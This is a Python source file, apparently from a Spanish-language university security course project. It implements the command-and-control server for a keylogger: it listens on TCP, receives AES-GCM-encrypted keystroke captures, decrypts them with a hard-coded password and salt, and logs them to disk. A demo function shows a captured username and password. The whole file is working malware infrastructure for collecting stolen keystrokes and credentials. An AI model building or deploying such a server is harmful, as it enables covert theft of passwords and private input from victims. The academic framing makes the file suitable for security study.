#!/usr/bin/env python3
"""
Proyecto Unidad 2 - Seguridad Informática
Servidor C2: recibe y descifra los datos del keylogger.

Uso:
    python3 server.py [--host HOST] [--port PUERTO] [--output ARCHIVO]
"""

import sys
import struct
import socket
import logging
import argparse
import threading
from datetime import datetime
from pathlib import Path

try:
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
    from cryptography.hazmat.primitives import hashes
except ImportError:
    print("[ERROR] Instale: pip install cryptography")
    sys.exit(1)


# Debe coincidir exactamente con keylogger.py
MASTER_PASSWORD = b"S3guridad_UTalca_2026"
SALT            = b"proyect0_keylogger_salt_v1"
KEY_ITERATIONS  = 200_000

DEFAULT_PORT = 9999
DEFAULT_HOST = "192.168.56.10"
OUTPUT_DIR   = Path("./received_logs")
OUTPUT_FILE  = OUTPUT_DIR / "captured_keystrokes.txt"


def derive_key(password: bytes, salt: bytes, iterations: int) -> bytes:
    """Deriva clave AES-256 con PBKDF2-HMAC-SHA256."""
    kdf = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=salt, iterations=iterations)
    return kdf.derive(password)


def decrypt_data(blob: bytes, key: bytes) -> bytes:
    """Descifra blob AES-256-GCM. Lanza InvalidTag si los datos fueron manipulados."""
    return AESGCM(key).decrypt(blob[:12], blob[12:], None)


class ClientHandler(threading.Thread):
    """Hilo que recibe, descifra y guarda los datos de una conexión entrante."""

    def __init__(self, conn: socket.socket, addr: tuple, key: bytes, output_file: Path):
        super().__init__(daemon=True)
        self._conn        = conn
        self._addr        = addr
        self._key         = key
        self._output_file = output_file

    def run(self):
        client_ip, client_port = self._addr
        logging.info(f"[SERVER] Conexión de {client_ip}:{client_port}")

        try:
            length_bytes = self._recv_exact(4)
            if not length_bytes:
                return

            payload_length = struct.unpack(">I", length_bytes)[0]
            if payload_length == 0 or payload_length > 10 * 1024 * 1024:
                logging.warning(f"[SERVER] Longitud inválida: {payload_length}")
                return

            encrypted_blob = self._recv_exact(payload_length)
            if not encrypted_blob:
                return

            plaintext = decrypt_data(encrypted_blob, self._key)
            decoded   = plaintext.decode("utf-8", errors="replace")

            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            output = (
                f"\n{'='*70}\n"
                f"[{timestamp}] {client_ip}:{client_port}\n"
                f"{'='*70}\n"
                f"{decoded}\n"
            )

            print(output)
            sys.stdout.flush()

            self._output_file.parent.mkdir(parents=True, exist_ok=True)
            with open(self._output_file, "a", encoding="utf-8") as f:
                f.write(output)

        except Exception as e:
            from cryptography.exceptions import InvalidTag
            if isinstance(e, InvalidTag):
                print(f"[!] Tag GCM inválido desde {client_ip} — posible MITM o clave incorrecta.")
            else:
                logging.error(f"[SERVER] Error con {client_ip}: {e}")
        finally:
            self._conn.close()

    def _recv_exact(self, n: int) -> bytes | None:
        """Recibe exactamente n bytes del socket."""
        data = b""
        while len(data) < n:
            chunk = self._conn.recv(n - len(data))
            if not chunk:
                return None
            data += chunk
        return data


def run_server(host: str, port: int, key: bytes, output_file: Path):
    server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_sock.bind((host, port))
    server_sock.listen(5)

    print(f"[*] Servidor C2 en {host}:{port} — guardando en {output_file} (Ctrl+C para detener)")
    logging.info(f"[SERVER] Escuchando en {host}:{port}")

    try:
        while True:
            conn, addr = server_sock.accept()
            ClientHandler(conn, addr, key, output_file).start()
    except KeyboardInterrupt:
        print("\n[*] Servidor detenido.")
    finally:
        server_sock.close()


def demo_encrypt_decrypt(key: bytes):
    """Demuestra el ciclo completo cifrado → descifrado sin red."""
    from keylogger import encrypt_data

    sample_text = "usuario: admin\ncontraseña: MiPass123!\n[ENTER]\n"
    print(f"[1] Texto capturado:\n{sample_text}")

    encrypted = encrypt_data(sample_text.encode(), key)
    print(f"[2] Cifrado (hex, primeros 64B): {encrypted[:64].hex()}...")
    print(f"    Tamaño: {len(encrypted)} bytes (nonce 12B + ciphertext + tag 16B)")

    decrypted = decrypt_data(encrypted, key)
    print(f"[3] Descifrado:\n{decrypted.decode()}")


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="Servidor C2 - Receptor del Keylogger")
    parser.add_argument("--port",   type=int, default=DEFAULT_PORT,
                        help=f"Puerto TCP (default: {DEFAULT_PORT})")
    parser.add_argument("--host",   type=str, default=DEFAULT_HOST,
                        help=f"Interfaz de red (default: {DEFAULT_HOST})")
    parser.add_argument("--output", type=str, default=str(OUTPUT_FILE),
                        help=f"Archivo de log (default: {OUTPUT_FILE})")
    parser.add_argument("--demo",   action="store_true",
                        help="Demo local de cifrado/descifrado sin red")
    return parser.parse_args()


def main():
    args = parse_args()

    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s [%(levelname)s] %(message)s",
        datefmt="%Y-%m-%d %H:%M:%S"
    )

    aes_key     = derive_key(MASTER_PASSWORD, SALT, KEY_ITERATIONS)
    output_file = Path(args.output)

    if args.demo:
        demo_encrypt_decrypt(aes_key)
        return

    run_server(args.host, args.port, aes_key, output_file)


if __name__ == "__main__":
    main()
